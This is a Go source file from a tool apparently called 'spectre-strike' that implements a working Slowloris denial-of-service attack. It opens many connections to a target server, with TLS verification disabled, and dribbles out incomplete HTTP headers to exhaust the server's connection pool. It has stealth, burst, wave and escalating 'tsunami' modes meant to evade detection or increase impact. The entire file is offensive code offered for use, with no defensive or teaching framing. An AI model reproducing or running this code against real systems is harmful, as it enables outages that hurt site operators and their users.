package attacks

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"sync"
	"time"

	"spectre-strike/pkg/utils"

	"github.com/fatih/color"
)

type AttackMode string

const (
	ModeNormal  AttackMode = "normal"
	ModeStealth AttackMode = "stealth"
	ModeBurst   AttackMode = "burst"
	ModeWave    AttackMode = "wave"
	ModeTsunami AttackMode = "tsunami"
)

type SlowlorisConfig struct {
	Target      string
	Duration    time.Duration
	Connections int
	Mode        AttackMode
}

type connectionStats struct {
	Active int
	Total  int
	Errors int
	mutex  sync.Mutex
}

func LaunchSlowloris(config SlowlorisConfig) error {
	parsedURL, err := url.Parse(config.Target)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	host := parsedURL.Hostname()
	port := parsedURL.Port()
	if port == "" {
		if parsedURL.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	stats := &connectionStats{}
	done := make(chan bool)

	// Start statistics reporter
	go reportStats(stats, config.Duration)

	// Launch connections based on mode
	switch config.Mode {
	case ModeStealth:
		go launchStealthMode(host, port, parsedURL, config, stats, done)
	case ModeBurst:
		go launchBurstMode(host, port, parsedURL, config, stats, done)
	case ModeWave:
		go launchWaveMode(host, port, parsedURL, config, stats, done)
	case ModeTsunami:
		go launchTsunamiMode(host, port, parsedURL, config, stats, done)
	default:
		go launchNormalMode(host, port, parsedURL, config, stats, done)
	}

	// Wait for duration
	time.Sleep(config.Duration)
	done <- true

	return nil
}

func launchNormalMode(host, port string, parsedURL *url.URL, config SlowlorisConfig, stats *connectionStats, done chan bool) {
	var wg sync.WaitGroup

	for i := 0; i < config.Connections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			maintainSlowConnection(host, port, parsedURL, stats, done)
		}()
		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

func launchStealthMode(host, port string, parsedURL *url.URL, config SlowlorisConfig, stats *connectionStats, done chan bool) {
	// Low and slow - fewer connections, longer intervals
	for i := 0; i < config.Connections/2; i++ {
		go maintainSlowConnection(host, port, parsedURL, stats, done)
		time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond)
	}
}

func launchBurstMode(host, port string, parsedURL *url.URL, config SlowlorisConfig, stats *connectionStats, done chan bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			// Burst of connections
			for i := 0; i < config.Connections/4; i++ {
				go maintainSlowConnection(host, port, parsedURL, stats, done)
			}
			color.Yellow("   💥 Burst launched!")
		}
	}
}

func launchWaveMode(host, port string, parsedURL *url.URL, config SlowlorisConfig, stats *connectionStats, done chan bool) {
	go func() {
		wave := 0
		for {
			select {
			case <-done:
				return
			default:
				// Oscillating intensity
				intensity := int(float64(config.Connections) * (0.5 + 0.5*float64(wave%100)/100.0))
				for i := 0; i < intensity/10; i++ {
					go maintainSlowConnection(host, port, parsedURL, stats, done)
				}
				wave++
				time.Sleep(500 * time.Millisecond)
			}
		}
	}()
}

func launchTsunamiMode(host, port string, parsedURL *url.URL, config SlowlorisConfig, stats *connectionStats, done chan bool) {
	go func() {
		multiplier := 1.0
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				// Progressive increase
				count := int(float64(config.Connections/10) * multiplier)
				for i := 0; i < count; i++ {
					go maintainSlowConnection(host, port, parsedURL, stats, done)
				}
				multiplier += 0.2
				if multiplier > 5.0 {
					multiplier = 5.0
				}
				color.Cyan("   🌊 Wave intensity: %.1fx", multiplier)
			}
		}
	}()
}

func maintainSlowConnection(host, port string, parsedURL *url.URL, stats *connectionStats, done chan bool) {
	defer func() {
		stats.mutex.Lock()
		stats.Active--
		stats.mutex.Unlock()
	}()

	var conn net.Conn
	var err error

	// Establish connection
	address := net.JoinHostPort(host, port)

	if parsedURL.Scheme == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		}
		conn, err = tls.Dial("tcp", address, tlsConfig)
	} else {
		conn, err = net.Dial("tcp", address)
	}

	if err != nil {
		stats.mutex.Lock()
		stats.Errors++
		stats.mutex.Unlock()
		return
	}
	defer conn.Close()

	stats.mutex.Lock()
	stats.Active++
	stats.Total++
	stats.mutex.Unlock()

	// Send initial HTTP request headers slowly
	headers := utils.GenerateRandomHeaders(parsedURL.Host)

	// Send request line
	fmt.Fprintf(conn, "GET %s HTTP/1.1\r\n", parsedURL.Path)
	time.Sleep(time.Duration(rand.Intn(5)+1) * time.Second)

	// Send headers one by one slowly
	for key, value := range headers {
		select {
		case <-done:
			return
		default:
			fmt.Fprintf(conn, "%s: %s\r\n", key, value)
			time.Sleep(time.Duration(rand.Intn(10)+5) * time.Second)
		}
	}

	// Keep connection alive by sending incomplete headers
	for {
		select {
		case <-done:
			return
		default:
			// Send random header to keep connection alive
			randomHeader := fmt.Sprintf("X-Keep-Alive-%d: %s\r\n",
				rand.Intn(10000),
				utils.RandomString(20))
			_, err := fmt.Fprint(conn, randomHeader)
			if err != nil {
				return
			}
			time.Sleep(time.Duration(rand.Intn(15)+10) * time.Second)
		}
	}
}

func reportStats(stats *connectionStats, duration time.Duration) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()

	for range ticker.C {
		elapsed := time.Since(startTime)
		if elapsed >= duration {
			break
		}

		stats.mutex.Lock()
		active := stats.Active
		total := stats.Total
		errors := stats.Errors
		stats.mutex.Unlock()

		remaining := duration - elapsed
		color.Cyan("   📊 Active: %d | Total: %d | Errors: %d | Remaining: %s",
			active, total, errors, remaining.Round(time.Second))
	}
}
